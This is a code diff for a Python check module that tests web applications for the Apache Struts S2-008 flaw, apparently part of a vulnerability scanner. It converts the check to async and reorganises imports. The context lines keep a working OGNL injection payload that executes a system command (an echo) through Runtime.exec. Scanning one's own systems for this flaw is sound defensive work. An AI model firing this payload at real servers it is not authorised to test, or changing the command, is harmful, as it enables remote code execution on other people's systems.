@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.encode import urlencode
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.encode import urlencode
+from app.lib.common import get_capta, get_useragent
 
 class S2_008_BaseVerify:
     def __init__(self, url):
@@ -24,7 +24,7 @@ class S2_008_BaseVerify:
         } 
         self.check_payload =  '?debug=command&expression=%28%23_memberAccess%5B"allowStaticMethodAccess"%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28"false"%29%20%2C%23context%5B"xwork.MethodAccessor.denyMethodExecution"%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27''' + urlencode(('echo' + ' ' + self.capta), 'utf-8') + '''%27%29.getInputStream%28%29%29%29'''
     
-    def check(self):
+    async def check(self):
         
         """
         检测是否存在漏洞
@@ -36,15 +36,12 @@ class S2_008_BaseVerify:
 
         try:
             check_url = self.url + self.check_payload
-            check_res = request.get(check_url, headers = self.headers)
-            if check_res.status_code == 200 and len(check_res.text) < 50 and self.capta in check_res.text:
+            check_res = await request.get(check_url, headers = self.headers)
+            if check_res.status == 200 and len(await check_res.text()) < 50 and self.capta in await check_res.text():
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
